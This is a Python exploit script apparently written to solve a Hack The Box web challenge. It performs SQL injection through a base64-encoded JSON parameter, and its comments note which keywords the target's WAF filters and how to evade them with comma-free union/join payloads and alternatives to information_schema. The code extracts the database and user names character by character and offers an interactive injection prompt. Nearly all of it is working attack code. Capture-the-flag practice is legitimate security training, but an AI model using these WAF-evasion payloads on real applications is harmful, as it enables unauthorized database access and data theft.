#!/usr/bin/env  python3

# WAF blocks:
# /*, */, comma ',', limit, offset, where, information_schema.tables, information_schema.columns

# it doesn't block:
# database(), union, select, join, if

# google how to overcome the two problems:
# 1. no comma in sqli
# 2. no information_schema
# we need alternatives.

# db: ezpz
# table: FlagTableUnguessableEzPZ
# table is get via mysql.innode_table_stats or information_schema.`tables`

import requests
import base64
import re
import sys
import string

BASE_URL = 'http://docker.hackthebox.eu:30579/index.php?obj='
CHARS = [c for c in string.printable if c != '%']

def clear_line():
    sys.stdout.write("\033[F")  #back to previous line
    sys.stdout.write("\033[K")  #clear line

def try_harder(injected, debug=False):
    payload_tmpl = '{{"ID":"{}"}}'
    payload = payload_tmpl.format("' union select * from (select 1)a join (" + injected + ")b; -- +")
    # payload = payload_tmpl.format("' " + injected + " -- +")
    enc = base64.b64encode(payload.encode()).decode()
    r = requests.get(BASE_URL + enc)
    if debug:
        m = re.match(r".*<center>(.+)</center>.*", r.text, re.DOTALL)
        if m:
            print(m.group(1))
        else:
            m = re.match(r".*<h4 .*>(.+)</h4>.*", r.text, re.DOTALL)
            if m:
                print(m.group(1))
    m = re.match(r".*<h4 .*>(.+)</h4>.*", r.text, re.DOTALL)
    if m:
        return m.group(1)

def get_db_name():
    len_db_name = int(try_harder('select(length(database()))'))
    assert len_db_name > 0
    
    db_name = ''
    print("Database name: ")
    for i in range(len_db_name):
        for c in CHARS:
            injected = "select database() like '{}%'".format(db_name + c)
            if try_harder(injected) == '1':
                db_name +=c
                clear_line()
                print("Database name: ", db_name)
                break
        assert len(db_name) == i + 1
    return db_name

def get_user_name():
    len_user_name = int(try_harder('select(length(user()))'))
    assert len_user_name > 0
    
    user_name = ''
    print("User name: ")
    for i in range(len_user_name):
        for c in CHARS:
            injected = "select user() like '{}%'".format(user_name + c)
            if try_harder(injected) == '1':
                user_name +=c
                clear_line()
                print("User name: ", user_name)
                break
        assert len(user_name) == i + 1
    return user_name

def main():
    while True:
        print(try_harder(input("Inject: "), True))
    # get_db_name()
    # get_user_name()

if __name__ == '__main__':
    main()
